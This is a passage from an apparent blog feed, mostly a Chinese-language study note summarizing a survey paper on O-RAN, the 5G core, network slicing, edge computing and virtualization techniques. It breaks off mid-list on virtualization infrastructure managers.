href="https://wiki.o-ran-sc.org/display/ORAN/Project+Developer+Wiki">https://wiki.o-ran-sc.org/display/ORAN/Project+Developer+Wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> 資源整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🗂️論文賞析:O-RAN 以及虛擬化 5G 網路</title>
      <link href="/posts/a1cfeb54.html"/>
      <url>/posts/a1cfeb54.html</url>
      
        <content type="html"><![CDATA[<div class="note primary no-icon flat"><p>這是篇survey paper<br><strong>Title</strong>: “Open, Programmable, and Virtualized 5G Networks: State-of-the-Art and the Road Ahead”<br><strong>College</strong>: Institute for the Wireless Internet of Things, Northeastern University<br><strong>Authors</strong>: Leonardo Bonati,Michele Polese,Salvatore D’Oro,Stefano Basagni,Tommaso Melodia<br><strong>Citation</strong>: 24</p></div><h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>5G很多好處，Software-defined cellular networks 也帶來很多變化，目前也許多5G開源專案，本篇會介紹非常多當前的開源5G專案以及其內部細節，並介紹其框架跟相應的硬體環境與Testbeds。</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>5G應用多元 - VR、遠程手術、高解析串流影像、私有(private)蜂窩網路，而傳統行動網路架構則相對不靈活、不彈性，無法滿足實現5G應用所具備的條件，現行行動網路的黑箱做法帶來許多限制，像是軟硬體隨插即用(plug and play)，但卻缺乏了重新設定的能力，並且無法控制大量可用資源，使其難以使網路操作達到即時流量控制這件事，並難以進行資源管理，效能也沒有最佳化，難以實現<strong>Connectivity-as-a-Service (CAAS)</strong> 技術，例如專用蜂窩網路(private cellular network)。</p><p>業界與學界皆認為5G應該改變這種Plug and play的作法，應該要採用可程式化、開放、資源共享、邊緣化的網路解決方案，例如 SDN、網路虛擬化、MEC(Multi-access Edge Computing)，這些方案使得動態網路控制與敏捷管理成為可能。同樣的，<strong>網路切片(Netwrok Slicing)</strong> 與  <strong>C-RAN(Cloud RAN)</strong> 也證實了 共享基礎架構(infrastrucutre sharing) 不僅能夠使資源利用最大化也能帶來新市場機會。傳統封閉的的電信網路一般人難以接觸到，現今由GNU Radio Libraries 定義的軟體範例被納入<strong>OpenAirInterface(OAI)</strong> 和<strong>srsLTE</strong> 之中，並可在商用SDR設備上快速部屬。軟體框架上像是O-RAN，運行在white-box 伺服器上，可供重新設定與優化網路和收發器功能。</p><h1 id="Architectural-enablers-of-5G-cellular-networks"><a href="#Architectural-enablers-of-5G-cellular-networks" class="headerlink" title="Architectural enablers of 5G cellular networks"></a>Architectural enablers of 5G cellular networks</h1><h2 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h2><p>行動網路已改變整體架構，從以往黑箱硬體配有專用軟韌體的架構變成基於運行在SDR或其他硬體的開元軟體，但這其實從4G時代就一直討論到現在。5G從spec上就極有敏捷部署的彈性在，在早期階段也在弄軟體化的服務，這種  <strong>flexibility-by-design</strong> 讓5G一開始就比較屌。此章節介紹從4G到5G的網路架構、RAN、核網、部屬範例、SDN、NFV、網路切片、MEC、智能(Intelligent)網路<br><img src="https://i.imgur.com/5fc7spi.png"></p><p>這張圖來看，4G部屬與5G似乎沒有差別，但其實在Core Network內部組成與設定卻差很多，</p><table><thead><tr><th>組成</th><th>4G</th><th>5G</th></tr></thead><tbody><tr><td>RAN</td><td>LTE</td><td>NR</td></tr><tr><td>Core</td><td>EPC</td><td>5GC</td></tr></tbody></table><p>4G EPC中有許多組成以往執行在專有硬體上的，最近才開始部署在軟體上的，<br>而5GC則是一開始就根據 基於服務的方法來設計的 EPC Server 被分成許多 <strong>虛擬網路功能(Virtual network functions)</strong> 來提供特定功能，彼此之間也透過開放標準界面來溝通；5G RAN中也有相似的拆分原則，(CU&#x2F;RU)…etc</p><h3 id="NR"><a href="#NR" class="headerlink" title="NR"></a>NR</h3><ul><li>wider range of carrier frequencies (mmWave Spectrum)</li><li>frame structure: OFDM-based，更具彈性、每個sub-frame中傳遞的可變數量的symbol，並可使用比LTE更大的頻寬(400Mhz per carrier)</li><li>訊號與程序的整合，用以管理mmWave的定向傳輸</li><li><strong>5G RAN可以接到4G EPC (non-standalone config) 與5G 5GC(standalone config)</strong></li><li>NR 基站 &#x3D; gNodeBs 允許分散式部屬: protocol stack的不同part可以分散在不同硬體組件中</li><li>NR的protocol stack中，在PDCP上在疊了一<strong>SDAP(Service Data Adaptation Protocol) layer</strong> ，它管理點對點流量之間的QoS，並將其mapping到gNodeB- UE link之間的本地資源，其他層皆有更新達到NR功能</li></ul><h3 id="CU-x2F-DU-split-and-the-virtualized-RAN-architecture"><a href="#CU-x2F-DU-split-and-the-virtualized-RAN-architecture" class="headerlink" title="CU&#x2F;DU split and the virtualized RAN architecture"></a>CU&#x2F;DU split and the virtualized RAN architecture</h3><p>NR中最創新的事就是將3GPP Stack 中的較高層(PDCP、SDAP、RRC)於較低層(RLC、MAC、PHY)分成兩個不同的logical units，也就是 CU(Control unit)與DU(Distributed Unit)，並可部屬在不同地方。而physical layer中的較低層可以與DU分開，獨立成一個RU(Radio Unit)；CU、DU、RU彼此可以藉由定義好的界面以不同的data rate跟latency來相互溝通。</p><p>這種架構出現在3GPP中，並使vRAN成(virtualized RAN)為可能:<br><code>attenna 元件</code> $\longrightarrow$ <code>RU</code><br><code>baseband、signal processing 單元</code> $\longrightarrow$ <code>CU、DU</code><br>以上皆可跑在通用或多廠商的平台或硬體元件上，若不同不同RAN components之間的介面是開放的，則部署上按照 O-RAN model走。</p><h3 id="The-5G-Core"><a href="#The-5G-Core" class="headerlink" title="The 5G Core"></a>The 5G Core</h3><p>service-based approach 控制與用戶平面核心功能被拆分成多個網路功能，3GPP中有定義這些網路功能的API，可實現彈性網路部屬與網路切片。</p><ul><li><strong>UPF(User Plane Function)</strong>: User到網路之間的gateway，作為移動性的錨(anchor)以及<strong>QoS分類器</strong></li><li><strong>CPF(Control Plane Function)</strong>:4G時的MME，大多被分配進了<strong>AMF(Access and Mobility Management Function)<strong>；</strong>SMF(Session Management Function)</strong> 負責分配IP地址到UE，並編排(orchestrates)用戶平面服務(例如:哪個UPF是UE該使用的)</li></ul><h2 id="Enabling-technologies-for-softwarized-5G-cellular-networks"><a href="#Enabling-technologies-for-softwarized-5G-cellular-networks" class="headerlink" title="Enabling technologies for softwarized 5G cellular networks"></a>Enabling technologies for softwarized 5G cellular networks</h2><p>5R整合不同功能組件、架構將會十分龐大，要管理將會是難題。5G網路參考了雲端計算生態圈中廣泛而完整的流程與架構，將虛擬化、軟體化整合在一起，使服務與辜能從原有硬體中抽離出來。</p><h3 id="Softwarization-and-software-defined-networking"><a href="#Softwarization-and-software-defined-networking" class="headerlink" title="Softwarization and software-defined networking"></a><code>Softwarization and software-defined networking</code></h3><p>為了整合不同廠商硬體元件之間的功能與設定參數，5G系統仰賴<strong>軟體化(Softwarization)</strong></p><ol><li>SDN </li><li>Openflow protocol</li></ol><blockquote><p>SDN: 將網路控制從data plane中解耦出來，將routing與controlling程序從原有的基於硬體的轉發操作中分離出來。5G中則是將RAN、邊緣硬體元件從它們的網路和服務功能中分離出來。</p></blockquote><p>RAN架構中只有RU維持基本transmit receive功能，其餘控制與處理則以藉由開放介面與API來用軟體操控。</p><h3 id="Network-function-virtualization-NFV"><a href="#Network-function-virtualization-NFV" class="headerlink" title="Network function virtualization(NFV)"></a><code>Network function virtualization(NFV)</code></h3><p>每項網路功能藉由VNF(Virtual Network Function)以軟體實踐，並執行在VM上(建立在通用硬體上)，NFV其中一項優點是每個VNF都提供原子級別的功能，<strong>因此多個VNFs可以結合在一起</strong> 創造出更複雜、特定的網路功能。</p><p><img src="https://i.imgur.com/H0J0R7K.png"></p><ol><li>The Network Orchestrator: 管理物件基礎架構上的VM，和其運行的服務</li><li>VNF:跑在VM上並執行網路功能</li><li>NFVI(Network Function Virtualization Infrastructure):由多種通用硬體組成</li></ol><blockquote><p>　open source network virtualization project:  <strong>Open Platform for NFV (OPNFV)</strong><br>　提供測試工具、驗證程式來加速企業和服務商網路轉換成NFV</p></blockquote><h2 id="RAN-and-Core-Network-slicing"><a href="#RAN-and-Core-Network-slicing" class="headerlink" title="RAN and Core Network slicing"></a>RAN and Core Network slicing</h2><p>Network Slicing是一種multi-tenancy虛擬化技術，其中網路功能從硬體和軟體中提取出來，並作為切片來提供給所謂的 <code>tenant</code> (租戶，房客)。物理基礎架構(基站、光纖、)會在多個租戶之間共享，一個租戶可能會收到一個或多個切片。 每個切片會分配特定的物理資源，並基於該物理資源上建立獨立的虛擬網路的<a href="https://www.ibm.com/docs/zh-tw/spss-modeler/SaaS?topic=node-what-is-instantiation"><strong>實例化(instantiate)</strong></a>，雖然租戶對自己的切片具有資源控制權，但卻無法與其他切片互動，這又被稱為<strong>slice isolation&#x2F;orthogonality</strong></p><p>每個切片涵蓋RAN與Core的部分的特定網路功能，租戶可在選定基站上透過RAN切片實例化提供 CaaS (for private cellular networking) 給行動用戶。也可分配RAN切片給特定的服務、用戶、應用上 Ex. 分配切片給資源需求高的應用(AR&#x2F;VR)<br><img src="https://i.imgur.com/EguDz3w.png"></p><p>這張圖在講切片技術怎樣使infra資源共享以及支援多切片嵌入在infra components的實例化並列出相關的開源軟體專案，他們各自對這個架構上的哪些部分做控制與設定和實體化。</p><h3 id="網路切片優點"><a href="#網路切片優點" class="headerlink" title="網路切片優點:"></a>網路切片優點:</h3><ol><li>每個切片都可以保留來處理具有不同安全要求的特定流量類別，並分配不同數量的資源，從而實現基礎設施級別的<strong>服務差異化(Service differentiation)</strong></li><li>切片由軟體控制，可實現對網路切片的即時、根據需求的實例化、重新設定與撤銷以適應時間變化的流量需求並符合<strong>SLAs(Service Level Aggrements)</strong></li><li>未充分利用資源以網路切片形式可出租給 <code>MVNO(Mobile Virtual Network Operators)</code>，來實現資源的最大利用程度，並給予infra提供者新的營利商機</li></ol><p>網路切片需要被動態編排、實例化、撤銷，並符合SLAs，並對於故障或中斷有強大的容忍性。</p><p><strong>OSSs(Operations Support Systems)</strong><br>OSS可透過對網路切片的閉路控制與管理來，作為保證履行服務的工具<br>同時，為垂直行業提供切片服務的運營商和基礎設施所有者必須通過專門用於反映垂直行業需求的服務的切片來生成多樣化的報價。<br><strong>BSSs(Business Support Systems)</strong><br>BSS 將需要控制這個多樣化的環境並為每個切片實施動態計費和定價機制</p><h2 id="Multi-access-edge-computing"><a href="#Multi-access-edge-computing" class="headerlink" title="Multi-access edge computing"></a>Multi-access edge computing</h2><p>5G高效能的訊號處理、傳輸機制、資料傳輸率仍無法滿足其吞吐量和對低延遲的要求，像是處理VR&#x2F;AR等這種即時性高的應用，而<strong>MEC</strong>能解決這問題。</p><p>MEC將架構的基本組件移到更靠近使用者的位置，通過建立在邊緣計算、內容緩存、NFV 和 SDN 的基礎上，MEC為 5G 應用的延遲和吞吐量需求提供了有效的解決方案。</p><ol><li>由於內容與資料在邊緣被處理，因此資料僅需偶而傳輸至CN，進而使傳輸延遲時間降低，也使CN負擔降低。</li><li>支持本地化服務供應，提供蜂窩網路專網，用於健康、環境監測、邊緣IOT運算…etc</li></ol><h2 id="Intelligence-in-the-network"><a href="#Intelligence-in-the-network" class="headerlink" title="Intelligence in the network"></a>Intelligence in the network</h2><p><code>ML/AI</code><br>資料驅動、自動化的5G網路變成可能，可用不同的use case去訓練並最佳化RAN<br>用例範圍從預測流量需求以擴展 CN 資源 到減少超可靠和低延遲通信 (URLLC) 中的延遲</p><p>而實現這種方案的框架即為O-RAN，透過與gNB,eNB互動的RIC來監控資料、學習與執行閉路驅動。</p><h1 id="The-radio-access-network"><a href="#The-radio-access-network" class="headerlink" title="The radio access network"></a>The radio access network</h1><blockquote><p>這章描述用於部屬4G&#x2F;5G的開源函式庫和框架，細節都可以在專案官網找到，故不贅述</p></blockquote><h3 id="OpenAirInterface"><a href="#OpenAirInterface" class="headerlink" title="OpenAirInterface"></a>OpenAirInterface</h3><p><a href="https://openairinterface.org/">https://openairinterface.org/</a></p><h3 id="srsLTE"><a href="#srsLTE" class="headerlink" title="srsLTE"></a>srsLTE</h3><p><a href="https://www.srslte.com/">https://www.srslte.com/</a></p><h3 id="Radysis-open-source-RAN-contributions"><a href="#Radysis-open-source-RAN-contributions" class="headerlink" title="Radysis open source RAN contributions"></a>Radysis open source RAN contributions</h3><p><a href="https://www.radisys.com/solutions/openran">https://www.radisys.com/solutions/openran</a></p><h1 id="Core-Network"><a href="#Core-Network" class="headerlink" title="Core Network"></a>Core Network</h1><p>此章節闡述針對4、5G的主流開源方案 i.e. EPC, 5G Core</p><h2 id="Evolved-Packet-Core-EPC"><a href="#Evolved-Packet-Core-EPC" class="headerlink" title="Evolved Packet Core (EPC)"></a>Evolved Packet Core (EPC)</h2><p>4G EPC的實現已在 2.1節討論過，通常包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- MME(Mobile Management Entity)</span><br><span class="line">- Home Subscription Server(HSS)</span><br><span class="line">- Service Gateway(SGW)</span><br><span class="line">- Packet Gateway(PGW)</span><br></pre></td></tr></table></figure><p><strong>MME(Mobile Management Gateway)</strong></p><ul><li>與UE建立連接的控制訊息</li><li>尋呼與移動性程序</li><li>NAS信令(signalling)</li><li>安全功能像是追蹤區域列表管理</li><li>PGW&#x2F;SGW選擇</li><li>UE身分認證</li><li>可達性程序</li><li>承載管理(bearer management)<br>i.e. EPC情況下為UE與PGW之間的通道，5GC情況下為UE與UPF之間的通道</li><li>支援EPC與E-UTRAN之間的控制平面信令協定</li><li>可靠的訊息傳輸服務</li><li>支援用於UDP控制訊息的通道協定</li><li>支援用於對UE進行認證、授權、計費的協定</li></ul><p><strong>HSS(Home Subscription Server)</strong></p><ul><li>User Database: 儲存subscriber資料(id 與 key)</li><li>User Authentication</li><li>提供User與MME之間的介面</li></ul><p>SGW與PGW組件通過 <strong><a href="https://zh.wikipedia.org/zh-tw/GPRS%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE">GTP</a></strong> 為用戶與控制平面傳送資料<br>i.e. GRPS Tunneling Protocol User Plane(GTP-U)、GRPS Tunneling Protocol Control Plane(GTP-C) 並使用UDP作為傳輸層協定</p><div class="note info flat"><p>GTP 5G也有實作，去年被爆出洞<br>　<a href="https://www.ithome.com.tw/news/138340">https://www.ithome.com.tw/news/138340</a><br>　<a href="https://itw01.com/8JS4VEH.html">https://itw01.com/8JS4VEH.html</a></p></div><p>支援Packet Routing和Forwarding，分配IP位址給UE，Paging機制，支援LTE EPC的開源專案有:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- OpenAirInterface(with OAI-CN)</span><br><span class="line">- srsLTE(with srsEPC)</span><br><span class="line">- Open5GS</span><br><span class="line">- Open Mobile Evolved Core(OMEC)</span><br></pre></td></tr></table></figure><p>各開源專案對於EPC各介面實作情況<br><img src="https://i.imgur.com/671qK43.png"></p><h2 id="5G-Core"><a href="#5G-Core" class="headerlink" title="5G Core"></a>5G Core</h2><p><img src="https://i.imgur.com/pZoXlQI.png"></p><p>目前實踐5G核網的開源專案是<strong>Free5GC</strong>，是基於NextEPC(現在的Open5GS)去實作的，<br>提供</p><ul><li>使用者存取、移動性、會話(AMF與SMF)管理</li><li>由其他NF提供的服務發現(Service Discovery)功能  (NRF)</li><li>提供NFs來選擇分配UE的切片 (Network Slice Selection Function)</li><li>管理、儲存、取得使用者資料 (UDM、UDR)</li><li>UE的認證 (AUSF)</li><li>核網的運營與管理 (Operations, Administration and Maintenance (OAM))</li><li>網路編排 …etc</li></ul><p>有被free5gc實作出的3GPP介面:</p><ul><li><strong>N1&#x2F;N2</strong>: 分別連接AMF到UE與RAN，用來進行會話與移動性管理</li><li><strong>N3&#x2F;N4&#x2F;N6</strong>: 分別連接UPF到RAN,SMF,與網路(data network)</li><li><strong>N8</strong>: 連接UDM 與 AMF，進行使用者認證程序</li><li><strong>N10&#x2F;N11</strong>: 分別連接SMF到UDM與AMF，負責處理訂閱及會話管理請求</li><li><strong>N12&#x2F;N13</strong>: 分別連接AUSF到AMF與UDM，它們啟用認證服務</li></ul><h1 id="RAN-and-core-frameworks"><a href="#RAN-and-core-frameworks" class="headerlink" title="RAN and core frameworks"></a>RAN and core frameworks</h1><p>這章描述了多個運用在RAN與核網的<strong>開放框架</strong><br>雖然第三、四章所講的軟體可以執行特定功能，但以下段落所介紹的框架更通用且範圍更廣，並與RAN、CN用於管理、控制與協調</p><p><em>開放框架與架構整理</em><br><img src="https://i.imgur.com/qE16Kyt.png"></p><h2 id="O-RAN"><a href="#O-RAN" class="headerlink" title="O-RAN"></a>O-RAN</h2><p>由O-RAN聯盟所提倡的針對vRAN的開放標準定義，並有兩大目標。<br>第一個是藉由部屬在edge的智慧控制器來整合ML,AI技術<br>第二個是對於開放與敏捷的定義，由RAN的不同元件之間定義明確的介面來實現，<br><strong>由於O-RAN必須公開相同的API，因此很容易將組件替換為其他相同功能的替代組件</strong> 這種作法使5G O-RAN可以整合不同廠商的元件。</p><p><img src="https://i.imgur.com/LP2jmRl.png"></p><h3 id="O-RAN-architecture"><a href="#O-RAN-architecture" class="headerlink" title="O-RAN architecture"></a>O-RAN architecture</h3><p>最頂部的SMO運行著一個non-RT RIC，它以高於1秒的粒度(granularity)執行<strong>控制決定</strong>(control decisions)，它可以提供O-RAN不同功能，例如說可以針對RAN所提供的資料來訓練不同的演算法。</p><p>然而 near-RT RIC，運行著一個<strong>控制迴圈</strong>，並且有著比較密集的時間區間(decision &lt; 10 ms)，會依賴RAN不同的start,stop,override或control 的型別而有所不同 e.g. radio resource management</p><p><strong>這些API可被安裝在near-RT RIC上的應用程式(又稱xApps)來使用</strong><br>而這些xApps可由第三方實體所開發並從公共商店(marketplace)中取得。<br>舉例來說，藉由near-RT RIC和它的xApps，營運商可以控制用戶移動過程(user mobility processes，即 handovers)，根據預測的聯網車輛和無人機的路徑來分配網路資源，執行負載平衡和交通轉向並優化排程策略。near-RT RIC也可以使用在non-RT RIC中所訓練的演算法來做點事。</p><p>O-RAN的其他組件像是CU&#x2F;DU&#x2F;RU，像是5G gNB被拆分成CU&#x2F;DU&#x2F;RU和4G eNB。CU又被進一步拆分成，控制面CU跟用戶面CU。根據3GPP對於不同拆分的定義，O-RAN選擇 <strong>split 7-2x</strong> 作為DU&#x2F;RU的拆分；因此在編碼、調變、和mapping資源都是由DU做的；然和解調變、cyclic prefix addition和digital to analog則是在RU中實現，而precoding則是在兩者中都行。</p><h3 id="O-RAN-interfaces"><a href="#O-RAN-interfaces" class="headerlink" title="O-RAN interfaces"></a>O-RAN interfaces</h3><p>兩個RIC之間的介面為A1介面，而non-RT RIC使用 O1介面與RIC和4G eNB互動</p><ul><li><p>A1介面讓near-RT RIC可提供:</p><ul><li>policy-based guidance to near-RT RIC(以防它偵測到其掏做未實現RAN的效能目標)</li><li>管理ML Model</li><li>向near-RT RIC提供豐富資訊，例如從RAN外部來源，來更進一步精細RAN的優化</li></ul></li><li><p>O1介面，則是具備操作與管理功能，並努力與現有標準兼容來實現與現有框架的完美整合，例如說他仰賴NETCONF或其他3GPP所定義的API。</p></li><li><p>non-RT RIC使用O1介面來:</p><ul><li>供應管理(provision management)</li><li>故障監督(fault supervision)</li><li>效能保證服務 (performance assurance services)</li><li>啟動、註冊和更新實體設備</li><li>管理通訊監控設備</li></ul></li><li><p>near-RT RIC也暴露了E2介面到其他不同元件上(CU,DU,eNB)；這個介面只專注部屬</p><ol><li>near-RT RIC對於E2介面終端節點的控制操作</li><li>管理RIC和這些節點互動行為</li></ol></li><li><p>E1與F1介面符合3GPP的規範。</p></li></ul><p>E1介面跑在控制與用戶面CU之間，它的主要功能是特定UE的trace蒐集與承載建立(bearer setup)和管裡<br>F1介面則是跑在CU與DU之間，它有兩個不同的版本，一個是連接到控制面CU另一個則是用戶面CU；F1負責在CU與DU之間傳送信令(signaling)和資料，以執行<strong>RPC程序</strong> 和<strong>PDCP-RLC交換</strong>。</p><p>最後，與RU之間的介面，則是由O-RAN內部的Open Fronthaul工作組來制定，這個介面攜帶用於data plane的<strong>compressed IQ samples</strong>和用於beamforming和其他物理層程序的控制消息。</p><h3 id="O-RAN-Deployment-Options"><a href="#O-RAN-Deployment-Options" class="headerlink" title="O-RAN Deployment Options"></a>O-RAN Deployment Options</h3><p>O-RAN設想了不同的部屬策略，分別是在區域(regional)或邊緣雲(edge cloud)或者是在營運商擁有的蜂窩基站。每個設施都可以運行O-Cloud，即容器和虛擬機，使用開放介面執行O-RAN程式，<br>或是有個專用的站點使用O-RAN的開放API但可以運行閉源程式碼(closed source code)，兩種情況下圖皆有描述，其描述了6種不同的O-RAN部屬組合</p><p><img src="https://i.imgur.com/dxigwNb.png"></p><p>在 Scenario A，所有元件除了RU以外，都部屬在網路邊緣，共同位於<strong>與fronthaul光纖連接的</strong> 相同的資料中心。</p><p>其他部屬策略是 RIC與CU共同部屬在區域雲設施中，而DU與RU位於網路邊緣或是蜂窩基站上，而首選的部屬策略是 <strong>Scenario B</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RIC在區域雲上</span><br><span class="line">CUs,DUs在edge</span><br><span class="line">只有RU是在營運商的蜂窩基站上</span><br></pre></td></tr></table></figure><h3 id="The-O-RAN-Software-Community"><a href="#The-O-RAN-Software-Community" class="headerlink" title="The O-RAN Software Community"></a>The O-RAN Software Community</h3><p>除了標準化活動，O-RAN也有軟體社群(OSC)，與Linux Foundation合作，貢獻符合O-RAN規範的5G軟體</p><p>第一個版本的釋出是2019的Amber release<br>第二個版本是2020的Bronze release</p><p>這些 release包含了Docker容器和多個O-ran組件的開源軟體:</p><ul><li>non-RT RIC :具有A1介面控制器和管理AI模型的能力</li><li>near-RT RIC 平台: 具有多個應用程序，像是:<ul><li>admission control</li><li>UE manager</li><li>performance and measurement monitor<br>  可藉由E2介面與DU溝通</li></ul></li><li>DU:<ul><li>一個初始版本的fronthaul函式庫</li></ul></li><li>一個用於操作、管理、維護以及虛擬化架構的框架</li><li>simulator:<ul><li>用於測試各個介面</li></ul></li></ul><p>而 cherry release 則是嘗試透過RIC完成不同RAN Component之間的整合。</p><blockquote><p>目前最新發行版為<a href="https://wiki.o-ran-sc.org/display/REL/F+Release">F-Release</a></p></blockquote><p>而 <strong>SD-RAN</strong> 專案也正在領導、開發一項開發工作，目標是實現與O-RAN RIC介面整合的開源規、符合3GPP的RAN。</p><h2 id="Open-Networking-Foundation-frameworks"><a href="#Open-Networking-Foundation-frameworks" class="headerlink" title="Open Networking Foundation frameworks"></a>Open Networking Foundation frameworks</h2><p>由多家電信營運商組成的聯盟，這些運營商提供用於部屬其網路開源程式以及框架<br>包含: OMEC、SD-RAN、ONOS<br>Components Projects 為了特定目的框架與軟體，而Exemplar包含了許多的 Components Projects。</p><h2 id="Other-frameworks-and-projects"><a href="#Other-frameworks-and-projects" class="headerlink" title="Other frameworks and projects"></a>Other frameworks and projects</h2><p>除了O-RAN與ONF方案，許多開源社群也釋出了針對連通性、切片和核心的框架與專案</p><h3 id="5G-EmPOWER"><a href="#5G-EmPOWER" class="headerlink" title="5G-EmPOWER"></a>5G-EmPOWER</h3><p>是一套用於<strong>異構(heterogenous)</strong> RAN架構的作業系統，它由一個開源、可重新程式化的軟體平台組成，該平台將物理基礎設施抽象化，並提供高階API來操控RAN功能。</p><p>5G-EmPOWER 也將控制平面和用戶平面分開，這種分離實際上是由兩個主要組件組成: 一個中央控制器與一組代理。<br><strong>中央控制器:</strong></p><ol><li>作為OS，並且完全了解物理基礎設施功能</li><li>透過OpenEmpower協定來發送控制指令以編排代理的行為</li></ol><p><strong>代理:</strong></p><ol><li>運行在每個網路單元上</li><li>將底層RAN特定的協定(LTE、Wifi)實作 抽象化到控制器</li><li>根據控制器的指令來修改底層協定參數</li></ol><p>5G-EmPOWER目前支援多種無線電存取技術(Radio Access Technologies, RAT)<br>包含LTE、Wifi、LoRa  (5G NR尚未支援)</p><p>此外還有以下專案:</p><ul><li>FlexRAN</li><li>Magma</li><li>LL-MEC</li><li>LightEdge</li><li>OpenRAN (不等於O-RAN Projects)</li><li>Akraino REC</li><li>NVIDIA Aerial</li></ul><h2 id="Open-virtualization-and-management-frameworks"><a href="#Open-virtualization-and-management-frameworks" class="headerlink" title="Open virtualization and management frameworks"></a>Open virtualization and management frameworks</h2><p>除了RAN與CN軟體，虛擬化與管理框架也扮演重要的角色。</p><blockquote><p>ETSI定義了一個NFV MANO框架(Management and Orchestration)應有的共同特徵，主要是為了編排(Orchestrating)網路功能(NF)</p></blockquote><p><img src="https://i.imgur.com/IjG4wat.png"><br><em>上圖指出這些NFV對應在5G生態圈中的哪個部分</em></p><p><strong>NFV Orchestrators</strong> 負責提供網路服務，i.e. 實體及虛擬網路功能(PNF&#x2F;VNF)的結合能夠經由特定的拓樸來連接在一起，來管理它們的生命週期。</p><p>根據 ETSI架構:<br>一個NFV Orchestrator 由下列組成:</p><ol><li>一個管理虛擬化基礎設施(e.g. VIM(Virtualization Infra. Manager)框架，例如OpenStack,Kubernetes,Docker等)的子系統以及與物理硬體的連接</li><li>一個實際的MANO框架</li><li>它所管理的VNFs的集合<br>這些框架有著Northbound、Southbound API來與其它蜂窩網路組件互動<br>本章將會討論虛擬化技術、VIMs，討論受歡迎的 MANO框架像是ONAP、OSM、Open Baton</li></ol><h2 id="Virtualization-techniques"><a href="#Virtualization-techniques" class="headerlink" title="Virtualization techniques"></a>Virtualization techniques</h2><p>NFV將部署在網路中的服務與其運行的硬體基礎設施分離，而應用程式都被包進與硬體分隔虛擬機中，NFV消除了對每個NF對特定硬體的需求，實現網路的可擴增性</p><p><img src="https://i.imgur.com/QBfrv68.png"><br><em>此圖為NFV的高階架構圖，並展示多種實現方式</em></p><h2 id="Traditional-Virtual-Machine"><a href="#Traditional-Virtual-Machine" class="headerlink" title="Traditional Virtual Machine"></a>Traditional Virtual Machine</h2><p>硬體層級虛擬化、提供機器節級別的隔離，透過guest OS與kernel來模擬電腦系統<br>由於VNF有許多硬體虛擬化要求，因此傳統VM被認為是一種資源密集型的作法</p><h2 id="Bare-metal-hypervisors"><a href="#Bare-metal-hypervisors" class="headerlink" title="Bare-metal hypervisors"></a>Bare-metal hypervisors</h2><p>bare-metal hypervisor VM做法與傳統VM做法相近，但這種做法是Hypervisor直接run在主機的硬體上而不需要主機的作業系統，也可用於管理+運行容器或unikernel，而不是整個虛擬機</p><h2 id="Containers"><a href="#Containers" class="headerlink" title="Containers"></a>Containers</h2><p>打包特定程式以及它的dependencies，以虛擬化的方式來run應用程式和服務的虛擬環境<br>容器間彼此分隔，並共享host OS以及對kernel的存取，比起VM，不需要將底部硬體虛擬化，相比來說輕便許多，而容器可被透過與Host OS相接的<strong>容器管理員(container manager)</strong> 來維護<br>或透過Hypervisoer直接跑在裸機Host機器中</p><p>開源容器系統:</p><ul><li><strong>LXC</strong>: 現代容器的主要實踐辦法，透過cgroup與namespaces隔離以創造有獨立網路和process空間的虛擬環境</li><li><strong>Docker</strong>: 允許創造容器，使用OS級別的虛擬化來將他們部屬在機器上，與lxc不同點它將服務、應用、依賴項分解成每個容器內的模組化的單元跟分層，而這些分層可多個容器共享，增加容器映像檔的效率。</li></ul><h3 id="Unikernels"><a href="#Unikernels" class="headerlink" title="Unikernels"></a>Unikernels</h3><p>Unikels是微小、輕量，特製的image，唯一目的是為了run特定的應用程式，他們會將應用服務和其依賴編譯成可執行的虛擬映像檔，過程中不會去包含不必要的組件，因此unikernel能比起傳統容器和VM達到更好的效能；因為unikernel只會包含運行目標應用所必需的軟體元件因此暴露了比較少可能被惡意攻擊的功能，來提高系統的安全性。</p><p>目前已知Unikernel系統: <strong>ClickOS</strong>, <strong>IncludeOS</strong>, <strong>OSv</strong>,<strong>MirageOS</strong>, <strong>Unik</strong></p><p>蜂窩網路相關的Unikernel應用如下:(論文)</p><ul><li>整合Android的函式庫到OSv以降低MCC(Mobile Cloud Computer),MFC(Mobile Fog Computing)行動運算負擔</li><li>基於unikernel的5G網路CDN，如ClickOS,OSv,MirageOS</li><li>其中一篇論文對5g應用實例化為 VNF的IncludeOS unikernel和Docker做效能比較</li></ul><h2 id="Hypervisors"><a href="#Hypervisors" class="headerlink" title="Hypervisors"></a>Hypervisors</h2><p>是一套軟體用來跑虛擬機(guest machines)在實體機器上的(Host Machine)<br>Hypervisor的的關鍵任務是</p><ol><li>在主客體機器間提供虛擬化</li><li>管理客體機器資源的分配與重新分配(CPU,Memory,Storage)</li><li>主客體機器之間的資源調度</li></ol><p>有兩種類別的Hypervisor: Type1 ,Type2<br><strong>Type 1 :</strong>  Hypervioser直接跑在裸機(bare-metal)host機器上，並在host上作為OS<br>Example: Xen, Vmware ESXi<br><strong>Type 2 :</strong>  作為軟體層跑在host OS上<br>Example: Linux Kernel-based VM (KVM),BSD bhyve, Oracle Virtual Box</p><h3 id="Virtualization-infrastrucutre-managers-VIM"><a href="#Virtualization-infrastrucutre-managers-VIM" class="headerlink" title="Virtualization infrastrucutre managers(VIM)"></a>Virtualization infrastrucutre managers(VIM)</h3><p>VIM負責控制與管理NFV基礎設施架構和其資源，像是儲存、計算、網路資源、並在Host硬體上協調客體機器的實例化。<strong>VIM屬於MANO框架的一部分</strong>，框架部分前面提過了</p><p>VIMs的範例有: 